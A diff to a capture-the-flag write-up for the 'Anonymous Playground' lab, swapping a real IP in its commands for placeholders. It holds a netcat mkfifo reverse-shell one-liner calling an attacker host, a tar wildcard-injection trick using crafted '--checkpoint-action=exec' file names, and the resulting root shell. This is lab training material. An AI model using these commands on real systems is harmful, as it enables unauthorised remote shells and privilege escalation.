@@ -402,6 +402,7 @@ spooky@anonymous-playground:/home/spooky$
 <br>
 
 <p>Ran <code>linpeas.sh</code>.<br>
+ 
 - Discovered<br><br>
 - <code>root</code> has an unexpected folder ----- <code>/cdrom</code>.<br><br>
 - <code>SGID</code> ----- <code>/usr/bin/at</code> -----<code>CVE-2002-1614</code>.
@@ -458,10 +459,10 @@ Tought ... if we have a <code>spooky</code>´s file modified in the last 5 mins,
 
 
 ```bash
-spooky@anonymous-playground:/home/spooky$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.250.20 9000 >/tmp/f' > escalation.sh
+spooky@anonymous-playground:/home/spooky$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc AttackIP AttackIP >/tmp/f' > escalation.sh
 spooky@anonymous-playground:/home/spooky$ cat escalation.sh
 cat escalation.sh
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.250.20 9000 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1AttackIP AttackPort >/tmp/f
 spooky@anonymous-playground:/home/spooky$  echo "" > "--checkpoint-action=exec=sh escalation.sh"
 h escalation.sh"eckpoint-action=exec=sh
 spooky@anonymous-playground:/home/spooky$ echo "" > --checkpoint=1
@@ -478,10 +479,8 @@ spooky@anonymous-playground:/home/spooky$
 
 
 ```bash
-root@ip-10-10-250-20:~/AnonymousPlayground# nc -lnvp AttackPort
-Listening on 0.0.0.0 AttackPort
-Connection received on 10.10.201.47 35812
-/bin/sh: 0: can't access tty; job control turned off
+:~/AnonymousPlayground# nc -lnvp AttackPort
+...
 # id
 uid=0(root) gid=0(root) groups=0(root)
 # pwd
